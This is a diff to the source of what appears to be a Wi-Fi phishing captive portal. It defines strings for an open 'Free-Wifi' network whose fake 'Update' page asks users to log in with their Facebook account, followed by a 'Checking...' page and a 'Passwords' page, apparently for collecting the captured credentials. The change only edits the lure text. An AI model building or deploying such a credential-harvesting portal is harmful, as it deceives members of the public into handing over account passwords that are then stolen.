@@ -13,7 +13,7 @@ const char* SSID_NAME = "Free-Wifi";
 // Default main strings
 #define SUBTITLE "Router info."
 #define TITLE "Update"
-#define BODY "You may need to log in to your Facebook account to connect.<br> Example: User@gmail.com:Mypassword123"
+#define BODY "You may need to log in to your Facebook account to connect."
 #define POST_TITLE "Checking..."
 #define POST_BODY "Connecting... Please, wait until the proccess finishes.</br>Thank you."
 #define PASS_TITLE "Passwords"
